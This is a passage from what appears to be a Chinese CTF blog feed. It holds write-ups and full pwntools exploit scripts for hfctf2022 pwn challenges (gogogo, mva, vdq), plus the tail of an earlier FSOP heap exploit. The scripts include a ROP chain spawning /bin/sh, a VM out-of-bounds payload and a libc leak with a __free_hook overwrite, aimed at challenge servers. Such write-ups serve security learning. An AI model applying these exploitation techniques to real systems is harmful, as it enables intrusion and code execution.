class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>    fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    add(<span class="hljs-number">0x400</span>, fake_IO_FILE)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30191</span>)<br><span class="hljs-comment">#p = remote(&#x27;172.17.0.1&#x27;, 9999)</span><br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>exp()<br>p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hfctf2022</title>
    <link href="/2023/07/06/hfctf2022/"/>
    <url>/2023/07/06/hfctf2022/</url>
    
    <content type="html"><![CDATA[<p>今年的天津市的ctf比赛竟然使用奇安信的平台，想到去年的市赛不知道用谁家的平台，连个pwn的靶机都没搞好，体验巨差，今年奇安信的平台就非常舒服。</p><p>天津市的ctf比赛全是入门题，没什么可说的。后来我看到奇安信的平台上还有存有去年虎符ctf的题，自己就试着复现一下。</p><p>网上其他师傅也都复现过，建议直接看这些师傅的博客：</p><p><a href="https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/">https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://bbs.kanxue.com/thread-271978.htm">https://bbs.kanxue.com/thread-271978.htm</a></p><p><a href="https://www.xi4oyu.top/cdcd3a27">https://www.xi4oyu.top/cdcd3a27</a></p><p><a href="https://r3kapig.com/writeup/20211102-hacklu/#unsafemid">https://r3kapig.com/writeup/20211102-hacklu/#unsafemid</a></p><p>​                                                                                     </p><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p>真佩服出题人的脑洞，拿个main__main函数迷惑你，真正的主函数是math_init函数，里面的字符串竟然是由一个一个字母打印出来的</p><img src="/img/15/Screenshot 2023-07-10 141548.png" style="zoom:80%;" /><p>这里参考了一下<a href="https://www.hex-rays.com/products/ida/support/idadoc/1361.shtml">ida的user_call教程</a>，改变一下函数参数调用规则，让伪代码更好看。最后的漏洞是在通过BULLS AND COWS的游戏后进入exit选项后的栈溢出（正常人哪想得到）。</p><p>最后的exp参考了<a href="https://blog.csdn.net/weixin_44946764/article/details/125211885">这篇博客的BULLS AND COWS的解法</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;gogogo&#x27;</span>)<br><span class="hljs-comment">#sh = process(&#x27;./gogogo&#x27;)</span><br>sh = remote(<span class="hljs-string">&#x27;112.74.186.148&#x27;</span>, <span class="hljs-number">49363</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#p.sendlineafter(b&#x27;:&#x27;, b&#x27;305419896&#x27;)</span><br><span class="hljs-comment">#p.sendlineafter(b&#x27;:&#x27;, b&#x27;1717986918&#x27;)</span><br>sh.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1416925456&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;GUESS\n&#x27;</span>)<br>li = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>]<br>guessli = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> li:<br>        <span class="hljs-keyword">if</span> u == i:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> li:<br>            <span class="hljs-keyword">if</span> u == o <span class="hljs-keyword">or</span> o == i:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> li:<br>                <span class="hljs-keyword">if</span> p == o <span class="hljs-keyword">or</span> p == u <span class="hljs-keyword">or</span> p == i:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">else</span>:<br>                    four = p<br>                    guessli.append([i,u,o,p])<br><br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> guess <span class="hljs-keyword">in</span> guessli:<br>    total += <span class="hljs-number">1</span><br>    time.sleep(<span class="hljs-number">1</span>)<br>    num = <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">0</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">1</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">2</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">3</span>])<br>    <span class="hljs-comment">#print(num)</span><br>    sh.sendline(num.encode())<br>    recv = sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;YOU WIN\n&#x27;</span> <span class="hljs-keyword">in</span> recv:<br>        <span class="hljs-keyword">break</span><br>    A = <span class="hljs-built_in">int</span>(recv[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>], <span class="hljs-number">10</span>)<br>    B = <span class="hljs-built_in">int</span>(recv[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>], <span class="hljs-number">10</span>)<br>    A = <span class="hljs-built_in">str</span>(A)<br>    B = <span class="hljs-built_in">str</span>(B)<br>    <span class="hljs-keyword">if</span>(total == <span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">break</span><br>    guessli.remove(guess)<br>    <span class="hljs-comment">#print(guessli)</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.isdigit(A) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(A) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>.isdigit(B) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(B) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(A)+<span class="hljs-built_in">int</span>(B) &lt;= <span class="hljs-number">4</span> :<br>                A = <span class="hljs-built_in">int</span>(A)<br>                B = <span class="hljs-built_in">int</span>(B)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> A == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> B == <span class="hljs-number">0</span> :<br>        guesslis = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslis:<br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> item:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">elif</span> A == <span class="hljs-number">0</span>:<br>        guesslia = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslia:<br>            <span class="hljs-keyword">if</span> item[<span class="hljs-number">0</span>] == guess[<span class="hljs-number">0</span>] :<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">1</span>] == guess[<span class="hljs-number">1</span>]:<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">2</span>] == guess[<span class="hljs-number">2</span>]:<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">3</span>] == guess[<span class="hljs-number">3</span>]:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">if</span> A + B &gt; <span class="hljs-number">0</span>:<br>        guesslib = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslib:<br>            count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> item :<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count &lt; A + B <span class="hljs-keyword">or</span> count &gt; A + B:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">if</span> A &gt; <span class="hljs-number">0</span>:<br>        guesslie = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslie:<br>            count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] == item[<span class="hljs-number">0</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">1</span>] == item[<span class="hljs-number">1</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">2</span>] == item[<span class="hljs-number">2</span>] :<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">3</span>] == item[<span class="hljs-number">3</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count &lt; A:<br>                guessli.remove(item)<br><br>sh.sendline(<span class="hljs-string">b&#x27;EXIT&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">b&#x27;(4) EXIT\n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br>pop_rax_ret = <span class="hljs-number">0x405b78</span><br>pop_rdx_ret = <span class="hljs-number">0x48546c</span><br>mov_rdi_rax_ret = <span class="hljs-number">0x45beb8</span><br>xchg_rsi_rax_ret = <span class="hljs-number">0x45b327</span><br>syscall_ret = <span class="hljs-number">0x45c849</span><br>payload = <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">0x460</span><br>payload += flat(<br>    pop_rax_ret, <span class="hljs-number">0x68732f6e69622f</span>,<br>    mov_rdi_rax_ret,<br>    pop_rax_ret, <span class="hljs-number">0</span>,<br>    xchg_rsi_rax_ret,<br>    pop_rdx_ret, <span class="hljs-number">0</span>,<br>    pop_rax_ret, <span class="hljs-number">0x3b</span>,<br>    syscall_ret<br>)<br>sh.sendlineafter(<span class="hljs-string">b&#x27;SURE?&#x27;</span>, payload)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># sh.sendlineafter(b&#x27;BYE~&#x27;, b&#x27;a&#x27;)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h3><p>一个vmpwn题，每4个字节为一个指令，最后也很容易找到这个数组的负数溢出</p><img src="/img/15/Screenshot 2023-07-10 143827.png" style="zoom:80%;" /><p>利用这个漏洞可以改掉pop操作中的数组索引，实现栈上的数据任意读，读取<code>__libc_start_main</code>函数，利用加减运算可以改为one_gadget，但是push操作对索引限制了大小 ，当时自己并没有想到合适方法来实现栈上的数据任意写，看了其他师傅的wp才恍然大悟，push中有<code>mov  [rbp+rax*2+var_210], dx</code>，利用rax*2的负数溢出即可绕过索引的限制。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;mva&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./mva&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">s1, val</span>):<br>    code = p8(<span class="hljs-number">1</span>) + p8(s1) + p8(val &gt;&gt; <span class="hljs-number">8</span>) + p8(val &amp; <span class="hljs-number">0xff</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s1, s2, s3</span>):<br>    code = p8(<span class="hljs-number">2</span>) + p8(s1) + p8(s2) + p8(s3)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">s1, s2, s3</span>):<br>    code = p8(<span class="hljs-number">3</span>) + p8(s1) + p8(s2) + p8(s3)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">s1, s2</span>):<br>    code = p8(<span class="hljs-number">0xe</span>) + p8(s1) + p8(s2) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>():<br>    code = p8(<span class="hljs-number">0x9</span>) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">s1</span>):<br>    code = p8(<span class="hljs-number">0xa</span>) + p8(s1) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br>payload = mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x10e</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf6</span>)<br>payload += pop(<span class="hljs-number">1</span>) + pop(<span class="hljs-number">2</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x582</span>) + sub(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0xc</span>) + add(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x10c</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf6</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf7</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x8000</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf9</span>)<br>payload += load(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>) + push() + load(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) + push()<br><br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><span class="hljs-comment"># pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="vdq"><a href="#vdq" class="headerlink" title="vdq"></a>vdq</h3><p>又是一道rust的题，流程倒是很简单，get_opr_lst函数中有个<code>serde_json::from_str</code>的反序列化操作，如果反序列化的结果错误是会直接退出的，自己当时为了搞清楚rust的反序列化还专门编译一个程序，再去用该程序在ida中分析。</p><p>当时的测试的代码如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> serde::&#123;Serialize, Deserialize&#125;;<br><span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>name: <span class="hljs-type">String</span>,<br>    age: <span class="hljs-type">i32</span><br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">point</span> = Person &#123;name:<span class="hljs-string">&quot;aaaaa&quot;</span>.<span class="hljs-title function_ invoke__">to_owned</span>(), age:<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">json</span> = serde_json::<span class="hljs-title function_ invoke__">to_string</span>(&amp;point).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, json);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">point1</span>: Person = serde_json::<span class="hljs-title function_ invoke__">from_str</span>(&amp;json).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, point1);<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                       </p><p>回到本题上去，要求反序列化的结果是一个<code>Vec&lt;vdq::Operation&gt;</code>，vdq::Operation是一个枚举类型：</p><img src="/img/15/Screenshot 2023-07-06 162332.png" style="zoom:80%;" /><p>搞清楚以后，最后测试一下序列化会变成字符串是什么内容：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> serde::&#123;Serialize, Deserialize&#125;;<br><span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Operation</span>&#123;<br>    Add,<br>    Remove,<br>    Append,<br>    Archive,<br>    View<br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span>:<span class="hljs-type">Vec</span>&lt;Operation&gt; = <span class="hljs-built_in">vec!</span>[Operation::Add, Operation::Remove];<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">json</span>:<span class="hljs-type">String</span> = serde_json::<span class="hljs-title function_ invoke__">to_string</span>(&amp;v).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, json);<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                       </p><p><code>vdq::handle_opr_lst</code>函数就是将反序列化的结果变成一个个类似于堆菜单的操作，自己当时完全没有发现任何漏洞，直接看其他师傅的文章后才知道还能直接用python写一个fuzz脚本直接将漏洞找出来，具体细节就直接看本文开头推荐的文章吧，自己复现时被rust的堆分配快折磨疯了。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vdq&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./vdq&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>json_string = <span class="hljs-string">&#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Add&quot;,&#x27;</span><br>json_string += <span class="hljs-string">&#x27;&quot;Remove&quot;, &quot;Remove&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Append&quot;, &quot;Append&quot;&#x27;</span><br>json_string += <span class="hljs-string">&#x27;]&#x27;</span><br><span class="hljs-comment">#json_string = &#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Add&quot;]&#x27;</span><br><span class="hljs-comment"># json_string = b&#x27;&#x27;&#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Archive&quot;, &quot;Archive&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Append&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Archive&quot;, &quot;Add&quot;]&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;!&#x27;</span>, json_string)<br>p.sendline(<span class="hljs-string">b&#x27;$&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x410</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x410</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;:\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27; -&gt; &#x27;</span>)<br>leak = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    leak += (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>))<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">96</span><br>libc.address = libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">7</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x12</span> - <span class="hljs-number">8</span> * <span class="hljs-number">4</span>) + p64(<span class="hljs-number">0</span>))<br><span class="hljs-comment"># gdb.attach(p)</span><br><span 